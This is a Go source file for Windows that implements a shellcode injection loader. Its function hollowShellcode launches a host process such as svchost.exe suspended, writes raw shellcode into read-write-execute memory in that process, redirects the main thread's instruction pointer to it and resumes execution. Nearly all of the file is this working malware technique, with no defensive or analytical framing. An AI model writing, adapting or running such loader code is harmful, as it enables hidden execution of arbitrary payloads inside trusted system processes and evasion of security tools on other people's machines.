//go:build windows

package main

import (
	"fmt"
	"unsafe"

	"golang.org/x/sys/windows"
)

// x64Context wraps a 1232-byte buffer for GetThreadContext / SetThreadContext.
// The buffer must be 16-byte aligned; we pad to guarantee that.
type x64Context struct {
	buf [1232 + 16]byte
	ptr uintptr
}

func newContext() *x64Context {
	c := &x64Context{}
	addr := uintptr(unsafe.Pointer(&c.buf[0]))
	if addr&15 != 0 {
		addr = (addr + 15) &^ 15
	}
	c.ptr = addr
	return c
}

func (c *x64Context) raw() uintptr { return c.ptr }

// ContextFlags at offset 48
func (c *x64Context) setContextFlags(f uint32) {
	*(*uint32)(unsafe.Pointer(c.ptr + 48)) = f
}

// Rip at offset 248
func (c *x64Context) rip() uint64 { return *(*uint64)(unsafe.Pointer(c.ptr + 248)) }
func (c *x64Context) setRip(v uint64) {
	*(*uint64)(unsafe.Pointer(c.ptr + 248)) = v
}

const contextAll uint32 = 0x0010001F // CONTEXT_ALL for AMD64

// hollowShellcode creates a new process in suspended state, injects shellcode,
// and redirects execution by patching the main thread's RIP.
//
// exe: path to the host process (e.g. "C:\\Windows\\System32\\svchost.exe")
// shellcode: raw shellcode bytes
func hollowShellcode(exe string, shellcode []byte) error {
	if len(shellcode) == 0 {
		return fmt.Errorf("empty shellcode")
	}

	exeW, err := windows.UTF16PtrFromString(exe)
	if err != nil {
		return fmt.Errorf("UTF16PtrFromString: %w", err)
	}

	var si windows.StartupInfo
	var pi windows.ProcessInformation
	si.Cb = uint32(unsafe.Sizeof(si))

	// CREATE_SUSPENDED = 0x4
	if err := windows.CreateProcess(
		exeW, nil, nil, nil, false,
		windows.CREATE_SUSPENDED,
		nil, nil, &si, &pi,
	); err != nil {
		return fmt.Errorf("CreateProcess(%s): %w", exe, err)
	}
	defer windows.CloseHandle(pi.Thread)
	defer windows.CloseHandle(pi.Process)

	// Allocate RWX region in target
	addr, _, e := procVirtualAllocEx.Call(
		uintptr(pi.Process), 0, uintptr(len(shellcode)),
		uintptr(memCommit|memReserve), uintptr(pageExecuteReadWrite),
	)
	if addr == 0 {
		windows.TerminateProcess(pi.Process, 1)
		return fmt.Errorf("VirtualAllocEx: %v", e)
	}

	// Write shellcode
	var written uintptr
	r, _, e := procWriteProcessMemory.Call(
		uintptr(pi.Process), addr,
		uintptr(unsafe.Pointer(&shellcode[0])),
		uintptr(len(shellcode)),
		uintptr(unsafe.Pointer(&written)),
	)
	if r == 0 {
		windows.TerminateProcess(pi.Process, 1)
		return fmt.Errorf("WriteProcessMemory: %v", e)
	}

	// Get main thread context and redirect RIP
	ctx := newContext()
	ctx.setContextFlags(contextAll)
	r, _, e = procGetThreadContext.Call(uintptr(pi.Thread), ctx.raw())
	if r == 0 {
		windows.TerminateProcess(pi.Process, 1)
		return fmt.Errorf("GetThreadContext: %v", e)
	}
	ctx.setRip(uint64(addr))
	r, _, e = procSetThreadContext.Call(uintptr(pi.Thread), ctx.raw())
	if r == 0 {
		windows.TerminateProcess(pi.Process, 1)
		return fmt.Errorf("SetThreadContext: %v", e)
	}

	// Resume main thread — shellcode runs at RIP
	procResumeThread.Call(uintptr(pi.Thread))
	return nil
}
